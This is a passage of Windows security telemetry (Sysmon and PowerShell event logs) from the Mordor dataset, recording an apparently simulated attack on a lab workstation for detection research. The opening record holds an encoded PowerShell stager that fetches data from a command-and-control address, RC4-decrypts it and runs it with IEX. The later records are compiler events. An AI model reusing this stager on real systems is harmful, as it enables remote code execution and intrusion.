KAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 50f3d352-332d-4cc2-9811-b903295a8adb\r\n        Pipeline ID = 1\r\n        Command Name = Add-Type\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28386\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"ImageLoaded":"C:\\Windows\\System32\\bcrypt.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=421C35E0949143DE72C8F98776565D24815AD47E,MD5=F46778029BE7D755EBDCDF048EA62A4B,SHA256=907A4D1D405283AD24BBA1F9A763C5118A33574F3E0EC7FC543F65B24CC0A748,IMPHASH=E5649DCD6FA9472DB9A89CCD123913C0","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows Cryptographic Primitives Library","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.267 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4052,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.302Z","port":64545,"RecordNumber":3399253,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"bcrypt.dll","UtcTime":"2020-09-22 08:22:42.944","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=36A9EF8C38706CB198AAB04DE49F9A0BC440CC62,MD5=AA6871A1B47FFC662A723679A867E653,SHA256=88FF8232C947924D7C5606382D5C099739431B554501809AC6C1BD846B545024,IMPHASH=2BC2B098BC197051D6B424CC7B54426F","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft .NET Runtime Common Language Runtime - WorkStation","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"4.8.4220.0 built by: NET48REL1LAST_C","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.303Z","port":64545,"RecordNumber":3399254,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft .NET Framework","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"clr.dll","UtcTime":"2020-09-22 08:22:43.069","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=857BBF02CE8D23ECB8BF15982A00D26C7CDC5FF3,MD5=35BCF77D01E16831D60D1F8E5B3EE5B2,SHA256=657543ADC4D4C9D8C423C846132ED86E5318450581893555B0975787AD38A311,IMPHASH=B8E36EE267C2FB85A6E12908085F0C26","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft .NET Runtime PE File Generator","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"4.8.3752.0 built by: NET48REL1","UserID":"S-1-5-18","ThreadID":4052,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.304Z","port":64545,"RecordNumber":3399255,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft .NET Framework","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"mscorpehost.dll","UtcTime":"2020-09-22 08:22:43.241","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":11,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","ThreadID":4048,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.305Z","TargetFilename":"C:\\Users\\pgustavo\\AppData\\Local\\Temp\\swetvsln\\CSCB57CBDD97A63426FA3A46968EC8A762.TMP","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399256,"Task":11,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"CreationUtcTime":"2020-09-22 08:22:43.241","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","Category":"File created (rule: FileCreate)","UtcTime":"2020-09-22 08:22:43.241","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":11,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","ThreadID":4048,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.305Z","TargetFilename":"C:\\Users\\pgustavo\\AppData\\Local\\Temp\\RES4CA4.tmp","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399257,"Task":11,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"CreationUtcTime":"2020-09-22 08:22:43.241","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","Category":"File created (rule: FileCreate)","UtcTime":"2020-09-22 08:22:43.241","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":1,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","ParentImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","LogonGuid":"{b34bc01c-22a7-5f69-dfa7-100000000000}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","CommandLine":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Users\\pgustavo\\AppData\\Local\\Temp\\RES4CA4.tmp\" \"c:\\Users\\pgustavo\\AppData\\Local\\Temp\\swetvsln\\CSCB57CBDD97A63426FA3A46968EC8A762.TMP\"","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"Severity":"INFO","User":"THESHIRE\\pgustavo","Hashes":"SHA1=2A3249732F5AA4588A4A9895FFE217355041D663,MD5=C877CBB966EA5939AA2A17B6A5160950,SHA256=1FE531EAC592B480AA4BD16052B909C3431434F17E7AE163D248355558CE43A6,IMPHASH=55D76ADE7FFEA0F41FF2B55505C2B362","SourceName":"Microsoft-Windows-Sysmon","CurrentDirectory":"C:\\windows\\system32\\","Description":"Microsoft Resource File To COFF Object Conversion Utility","Category":"Process Create (rule: ProcessCreate)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"14.10.25028.0 built by: VCTOOLSD15RTM","IntegrityLevel":"High","UserID":"S-1-5-18","TerminalSessionId":"2","ThreadID":4048,"EventType":"INFO","ParentProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","@timestamp":"2020-09-22T08:22:44.305Z","port":64545,"ParentCommandLine":"\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\pgustavo\\AppData\\Local\\Temp\\swetvsln\\swetvsln.cmdline\"","RecordNumber":3399258,"Task":1,"ParentProcessId":"1796","SourceModuleName":"eventlog","LogonId":"0x10a7df","Version":5,"Product":"Microsoft .NET Framework","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"CVTRES.EXE","UtcTime":"2020-09-22 08:22:43.255","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-b452-5f69-c502-000000000900}","ThreadID":4048,"TargetImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","GrantedAccess":"0x1fffff","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.306Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399259,"SourceProcessId":"1796","SourceThreadId":"5904","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-b453-5f69-c602-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"1264","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9d8e4|C:\\windows\\System32\\KERNELBASE.dll+59e1a|C:\\windows\\System32\\KERNELBASE.dll+567b6|C:\\windows\\System32\\KERNEL32.DLL+1be93|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll+b46d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll+3db4|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll+3f2c|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll+4002|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll+27b2|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll+2804|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorpehost.dll+2948|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+7fe06|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+4726f|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+45e1f|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+45b16|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+45826|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+1938a|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+18bf6|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+a831|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe+1f0a49|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\csrss.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-22a3-5f69-9600-000000000900}","ThreadID":4048,"TargetImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","GrantedAccess":"0x1fffff","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.307Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399260,"SourceProcessId":"5220","SourceThreadId":"5292","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-b453-5f69-c602-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"1264","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\system32\\basesrv.DLL+2fba|C:\\windows\\SYSTEM32\\CSRSRV.dll+5af4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce5f","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\ntdll.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=BFD8EE26537D8C30A5FE2C9753AEED3BB6930004,MD5=BD5F9D4684E7BCB9D41D298297A73956,SHA256=FB9DA8BAF27DADDE620C2D8D3CADDD4CF7BF405A9BC8E870A73B6CF163046176,IMPHASH=00000000000000000000000000000000","SourceName":"Microsoft-Windows-Sysmon","Description":"NT Layer DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1049 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.307Z","port":64545,"RecordNumber":3399261,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"ntdll.dll","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\kernel32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=9044BFB6E7D920BB4586123237B512238F2EA726,MD5=B78D8D39F63C5B7B9A2F4BC31076C954,SHA256=08BE2EE23EE5A7722C4BACA3BD8F0EABA7A56302F0051E6802A36D35AB0BC41C,IMPHASH=F9F97E60CFCD78BE051D9570C88FFB6F","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows NT BASE API Client DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1082 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.307Z","port":64545,"RecordNumber":3399262,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"kernel32","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\KernelBase.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=0BE0E331F4F9C2ED8C9D989CDCFD10463FE3E047,MD5=D62F3401037D0D0CE1F41555B72F1B60,SHA256=B51E88CCD1517E923A7A3E21B2AFC856927D529F5C5668A072B4B12AC70AD46B,IMPHASH=16003AF856720C35351BB8C14AD0B0A8","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows NT BASE API Client DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1049 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.308Z","port":64545,"RecordNumber":3399263,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"Kernelbase.dll","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\conhost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-a8ae-5f69-7d02-000000000900}","ThreadID":4048,"TargetImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","GrantedAccess":"0x1fffff","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.308Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399264,"SourceProcessId":"2536","SourceThreadId":"2580","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-b453-5f69-c602-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"1264","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+305fe|C:\\windows\\system32\\conhost.exe+1260d|C:\\windows\\system32\\conhost.exe+12505|C:\\windows\\system32\\conhost.exe+895c|C:\\windows\\system32\\conhost.exe+f2e6|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=2A3249732F5AA4588A4A9895FFE217355041D663,MD5=C877CBB966EA5939AA2A17B6A5160950,SHA256=1FE531EAC592B480AA4BD16052B909C3431434F17E7AE163D248355558CE43A6,IMPHASH=55D76ADE7FFEA0F41FF2B55505C2B362","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft Resource File To COFF Object Conversion Utility","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"14.10.25028.0 built by: VCTOOLSD15RTM","UserID":"S-1-5-18","ThreadID":4052,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.308Z","port":64545,"RecordNumber":3399265,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft .NET Framework","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"CVTRES.EXE","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\advapi32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=35C61DDE6F8F4ED05F9C4837E2B91C886CA79F82,MD5=EA4F6E7961B4A402F6F5EC33C655260A,SHA256=5E2D103E7E1FD7CA0492E541F082D274EF6259AF2158A3562986C796C5C869DD,IMPHASH=8EEA175C33205685FB8A14876D7564DB","SourceName":"Microsoft-Windows-Sysmon","Description":"Advanced Windows 32 Base API","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.752 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.310Z","port":64545,"RecordNumber":3399266,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"advapi32.dll","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
